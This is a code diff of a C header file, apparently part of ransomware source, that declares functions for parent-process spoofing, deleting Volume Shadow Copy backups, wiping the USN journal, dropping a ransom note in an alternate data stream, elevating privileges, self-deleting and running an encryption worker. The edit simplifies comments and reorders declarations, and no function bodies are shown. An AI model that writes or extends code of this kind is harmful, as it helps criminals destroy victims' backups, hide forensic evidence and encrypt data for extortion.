@@ -1,4 +1,4 @@
-/* utils.h - Advanced stealth interface */
+/* utils.h - Simplified utility interface */
 #ifndef UTILS_H
 #define UTILS_H
 
@@ -8,31 +8,30 @@
 extern "C" {
 #endif
 
-/* ─── Stealth init ─── */
+/* Stub - no longer needed */
 void InitAllSyscalls(void);
 
-/* ─── PPID Spoofing ─── */
+/* PPID Spoofing */
 DWORD FindProcessPidStr(const char* procName);
-HANDLE CreateProcessSpoofed(LPCSTR cmdLine, DWORD parentPid);
 
-/* ─── COM-based VSS deletion ─── */
+/* VSS deletion */
 void NukeBackupsCOM(void);
+void NukeBackups(void);
 
-/* ─── USN Journal wipe ─── */
+/* USN Journal wipe */
 void WipeUSNJournal(void);
 
-/* ─── ADS ransom note ─── */
+/* ADS ransom note */
 void DropNoteADS(void);
 
-/* ─── IO priority ─── */
+/* IO priority */
 void SetIoCrtitical(void);
 
-/* ─── Self-delete with spoofed parent ─── */
+/* Self-delete */
 void SelfDeleteSpoofed(void);
 
-/* Original functions kept for compatibility */
+/* Original functions */
 void ElevatePrivileges(void);
-void NukeBackups(void);
 void DropNote(void);
 void SelfDelete(void);
 unsigned __stdcall EncryptionWorker(void* arg);
